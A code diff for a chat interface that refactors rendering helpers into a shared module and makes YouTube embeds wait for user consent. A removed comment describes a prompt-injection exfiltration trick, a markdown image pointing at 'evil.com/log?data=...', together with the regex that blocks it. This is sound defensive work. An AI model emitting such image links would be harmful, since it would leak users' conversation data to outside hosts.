@@ -285,41 +285,15 @@ def render_video_with_save(path_or_fname: str, thread_id: str | None = None) -> 
         ).tooltip("Save video")
 
 
-# ── Bare-URL auto-linking ────────────────────────────────────────────
-# Matches (in priority order) patterns we must *skip*, then bare URLs
-# we want to convert.  Only capture-group 1 (bare URL) triggers a
-# replacement; everything else is returned unchanged.
-_AUTOLINK_RE = re.compile(
-    r'```[\s\S]*?```'              # fenced code block  — skip
-    r'|`[^`\n]+`'                  # inline code        — skip
-    r'|\[[^\]]*\]\([^\)]+\)'       # markdown link      — skip
-    r'|<https?://[^>]+>'           # angle-bracket link — skip
-    r'|(https?://[^\s<>\)\]"\']+)',  # bare URL → group 1
-)
-
-
-def _autolink_replace(m: re.Match) -> str:
-    url = m.group(1)
-    if not url:
-        return m.group(0)
-    # Strip a single trailing punctuation that is almost certainly
-    # sentence-ending rather than part of the URL.
-    trail = ""
-    if url[-1] in ".,;:!?":
-        trail = url[-1]
-        url = url[:-1]
-    return f"[{url}]({url}){trail}"
-
-
 def autolink_urls(text: str) -> str:
     """Wrap bare http(s) URLs in markdown link syntax.
 
     Preserves URLs already inside ``[text](url)``, ``<url>``, inline
     code, or fenced code blocks.
     """
-    if "http" not in text:
-        return text
-    return _AUTOLINK_RE.sub(_autolink_replace, text)
+    from row_bot.application.transcript_blocks import autolink_urls as shared
+
+    return shared(text)
 
 
 # Matches a YouTube URL with optional surrounding markdown link + bold:
@@ -337,53 +311,11 @@ _YT_EMBED_RE = re.compile(
     r'\*{0,2}',                                       # optional trailing **
 )
 
-_MERMAID_START_RE = re.compile(
-    r"^(graph|flowchart|sequenceDiagram|classDiagram|erDiagram|journey|gantt|"
-    r"stateDiagram(?:-v2)?|mindmap|timeline|pie)\b",
-    re.IGNORECASE,
-)
-
 # Matches a fenced ```mermaid ... ``` block (after _auto_fence_mermaid has run)
 _MERMAID_FENCE_RE = re.compile(
     r"^```mermaid\s*\n(.*?)\n```",
     re.MULTILINE | re.DOTALL,
 )
-
-
-def _is_mermaid_continuation_line(line: str) -> bool:
-    """Return True if a line likely belongs to a Mermaid diagram body."""
-    s = line.strip()
-    if not s:
-        return True
-    lower = s.lower()
-    if lower.startswith(
-        (
-            "graph ",
-            "flowchart ",
-            "sequencediagram",
-            "classdiagram",
-            "erdiagram",
-            "journey",
-            "gantt",
-            "statediagram",
-            "mindmap",
-            "timeline",
-            "pie",
-            "subgraph",
-            "end",
-            "classdef ",
-            "class ",
-            "style ",
-            "linkstyle ",
-            "click ",
-            "direction ",
-            "%%",
-        )
-    ):
-        return True
-    if any(tok in s for tok in ("-->", "---", "-.->", "==>", "<--", "<->", ":::", "|", "[", "]", "(", ")", "{", "}")):
-        return True
-    return False
 
 
 def _auto_fence_mermaid(text: str) -> str:
@@ -392,44 +324,9 @@ def _auto_fence_mermaid(text: str) -> str:
     Models sometimes output Mermaid syntax without ```mermaid fences,
     which prevents the UI mermaid renderer from detecting it.
     """
-    if not text or "```mermaid" in text:
-        return text
+    from row_bot.application.transcript_blocks import auto_fence_mermaid
 
-    lines = text.splitlines()
-    start_idx = None
-    for i, line in enumerate(lines):
-        if _MERMAID_START_RE.match(line.strip()):
-            start_idx = i
-            break
-
-    if start_idx is None:
-        return text
-
-    end_idx = len(lines)
-    body_lines: list[str] = []
-    for i in range(start_idx, len(lines)):
-        line = lines[i]
-        if _is_mermaid_continuation_line(line):
-            body_lines.append(line)
-        else:
-            end_idx = i
-            break
-
-    mermaid_body = "\n".join(body_lines).strip()
-    # Avoid false positives: Mermaid blocks generally include edges/subgraphs.
-    if "-->" not in mermaid_body and "subgraph" not in mermaid_body.lower():
-        return text
-
-    prefix = "\n".join(lines[:start_idx]).rstrip()
-    suffix = "\n".join(lines[end_idx:]).strip()
-    fenced = f"```mermaid\n{mermaid_body}\n```"
-    out_parts = []
-    if prefix:
-        out_parts.append(prefix)
-    out_parts.append(fenced)
-    if suffix:
-        out_parts.append(suffix)
-    return "\n\n".join(out_parts)
+    return auto_fence_mermaid(text)
 
 
 def _split_mermaid(parts: list[tuple[str, str | None]]) -> list[tuple[str, str | None]]:
@@ -696,19 +593,6 @@ def _render_mermaid_with_save(source: str) -> None:
         ).tooltip("Save diagram as PNG (up to 4K)")
 
 
-# ── Prompt‑injection defence: markdown image exfiltration guard ──────────
-# Matches ![alt](url) where the URL query/fragment is suspiciously long,
-# which could be an attempt to exfiltrate conversation data via an
-# auto-loading <img src="https://evil.com/log?data=..."> tag.
-_EXFIL_IMG_RE = re.compile(
-    r"!\[([^\]]*)\]"                     # ![alt text]
-    r"\("                                # (
-    r"(https?://[^)\s]+)"               # URL
-    r"\)",                               # )
-)
-_B64_SEGMENT_RE_UI = re.compile(r"[A-Za-z0-9+/=]{100,}")
-
-
 def _sanitize_exfil_images(text: str) -> str:
     """Replace markdown images whose URLs look like data‑exfiltration attempts.
 
@@ -716,19 +600,9 @@ def _sanitize_exfil_images(text: str) -> str:
     still accessible but the browser won't auto-fire a request with
     embedded data in the query string.
     """
-    def _check(m: re.Match) -> str:
-        url = m.group(2)
-        qmark = url.find("?")
-        # Check query string length
-        if qmark != -1 and len(url) - qmark > 200:
-            alt = m.group(1) or "image"
-            return f"⚠ *Blocked suspicious image link* — [{alt}]({url})"
-        # Check for base64 segments in URL
-        if _B64_SEGMENT_RE_UI.search(url):
-            alt = m.group(1) or "image"
-            return f"⚠ *Blocked suspicious image link* — [{alt}]({url})"
-        return m.group(0)  # pass through unchanged
-    return _EXFIL_IMG_RE.sub(_check, text)
+    from row_bot.application.transcript_blocks import sanitize_remote_images
+
+    return sanitize_remote_images(text)
 
 
 LONG_MARKDOWN_PREVIEW_THRESHOLD = 16_000
@@ -736,7 +610,7 @@ LONG_MARKDOWN_PREVIEW_CHARS = 5_000
 
 
 def _render_text_with_embeds_now(text: str) -> None:
-    """Render markdown text with inline YouTube video embeds and mermaid diagrams."""
+    """Render rich text without contacting external players before consent."""
     if not text:
         return
     text = _sanitize_exfil_images(text)
@@ -772,14 +646,37 @@ def _render_text_with_embeds_now(text: str) -> None:
     for kind, value in parts:
         if kind == "text" and value and value.strip():
             ui.markdown(autolink_urls(value), extras=['code-friendly', 'fenced-code-blocks', 'tables']).classes("row-bot-msg w-full")
-        elif kind == "video":
-            ui.html(
-                f'<iframe width="280" height="158" '
-                f'src="https://www.youtube.com/embed/{value}" '
-                f'frameborder="0" allowfullscreen '
-                f'style="border-radius:8px;"></iframe>',
-                sanitize=False,
-            )
+        elif kind == "video" and value:
+            video_id = value
+            video_url = f"https://www.youtube.com/watch?v={video_id}"
+            with ui.column().classes("gap-2 rounded-lg border p-3") as holder:
+                ui.label("YouTube video").classes("text-sm font-semibold")
+                ui.label("Loading this player contacts YouTube.").classes(
+                    "text-xs text-slate-500"
+                )
+                with ui.row().classes("items-center gap-2"):
+
+                    def _load_player(
+                        target: Element = holder, selected: str = video_id
+                    ) -> None:
+                        target.clear()
+                        with target:
+                            ui.html(
+                                f'<iframe title="YouTube video" width="280" height="158" '
+                                f'src="https://www.youtube-nocookie.com/embed/{selected}" '
+                                f'referrerpolicy="no-referrer" '
+                                f'sandbox="allow-scripts allow-same-origin allow-presentation" '
+                                f'frameborder="0" allowfullscreen '
+                                f'style="border-radius:8px;"></iframe>',
+                                sanitize=False,
+                            )
+
+                    ui.button("Load YouTube player", on_click=_load_player).props(
+                        "outline dense no-caps"
+                    )
+                    ui.link("Open video link", video_url, new_tab=True).classes(
+                        "text-sm"
+                    )
         elif kind == "mermaid" and value:
             _render_mermaid_with_save(value)
 
